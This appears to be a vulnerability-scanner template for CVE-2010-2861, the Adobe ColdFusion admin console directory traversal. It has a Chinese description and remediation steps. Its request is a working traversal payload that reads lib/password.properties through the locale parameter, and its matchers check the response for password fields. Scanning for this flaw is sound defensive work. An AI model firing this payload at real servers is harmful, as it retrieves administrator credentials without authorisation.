id: CVE-2010-2861
info:
  name: Adobe ColdFusion 8.0/8.0.1/9.0/9.0.1 LFI
  author:
  - l0ne1y
  description: |-
    Adobe ColdFusion管理控制台任意文件读取漏洞
    Adobe ColdFusion是一款高效的网络应用服务器开发环境。 Adobe ColdFusion 9.0.1及之前版本的管理控制台中存在多个目录遍历漏洞。远程攻击者可借助向CFIDE/administrator/中的CFIDE/administrator/settings/mappings.cfm，logging/settings.cfm，datasources/index.cfm，j2eepackaging/editarchive.cfm和enter.cfm发送的locale参数读取任意文件。
  severity: medium
  remediation: |
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    http://www.adobe.com/support/security/bulletins/apsb10-18.html

    临时修复方案：
    1、过滤目录跳转符、字符截断符等
    2、限制用户对CFIDE/administrator/settings/mappings.cfm、logging/settings.cfm、datasources/index.cfm、j2eepackaging/editarchive.cfm、enter.cfm等的访问
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - rdspassword=
    - encrypted=
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en'
  method: GET
